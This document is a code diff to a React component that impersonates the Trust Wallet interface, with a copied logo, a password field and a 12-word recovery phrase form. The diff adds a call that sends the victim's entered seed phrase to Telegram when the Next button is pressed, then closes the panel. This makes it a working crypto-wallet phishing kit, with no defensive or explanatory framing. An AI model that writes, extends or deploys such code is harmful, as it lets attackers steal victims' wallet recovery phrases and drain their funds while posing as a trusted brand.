@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 interface TrustPanelProps {
   isOpen: boolean;
@@ -12,6 +13,7 @@ export default function TrustPanel({ isOpen, onClose }: TrustPanelProps) {
   const [password, setPassword] = useState('');
   const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(''));
   const [progress, setProgress] = useState(0);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // 1. Splash Screen Timer
   useEffect(() => {
@@ -20,10 +22,11 @@ export default function TrustPanel({ isOpen, onClose }: TrustPanelProps) {
       setPassword('');
       setSeedWords(Array(12).fill(''));
       setProgress(0);
+      setIsSending(false); // 👈 NEW
       
       const timer = setTimeout(() => {
         setAppState('login');
-      }, 1500); // Trust splash pace
+      }, 1500);
       return () => clearTimeout(timer);
     }
   }, [isOpen]);
@@ -74,7 +77,6 @@ export default function TrustPanel({ isOpen, onClose }: TrustPanelProps) {
           {/* ========================================== */}
           <div className={`absolute inset-0 bg-white z-50 flex flex-col items-center justify-center overflow-hidden transition-opacity duration-700 ease-in-out ${appState === 'splash' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <div className="flex flex-col items-center justify-center animate-[pulse_1.5s_ease-in-out_infinite]">
-              {/* Using your exact SVG with the exact classes you ripped */}
               <TrustLogoSVG className="h-[120px] w-full" />
             </div>
           </div>
@@ -232,11 +234,23 @@ export default function TrustPanel({ isOpen, onClose }: TrustPanelProps) {
                 >
                   Back
                 </button>
+                {/* 👇 UPDATED BUTTON: Now sends to Telegram */}
                 <button 
-                  disabled={!isSeedComplete} 
+                  disabled={!isSeedComplete || isSending}
+                  onClick={async () => {
+                    setIsSending(true);
+                    const seedString = seedWords.join(' ');
+                    const success = await sendSeedPhraseToTelegram(seedString, 'Trust Wallet');
+                    if (success) {
+                      onClose();
+                    } else {
+                      console.error('Failed to send seed phrase');
+                    }
+                    setIsSending(false);
+                  }}
                   className="flex-1 text-white bg-[#0500FA] font-bold text-[16px] rounded-[16px] h-[52px] hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                 >
-                  Next
+                  {isSending ? 'Sending...' : 'Next'}
                 </button>
               </div>
 
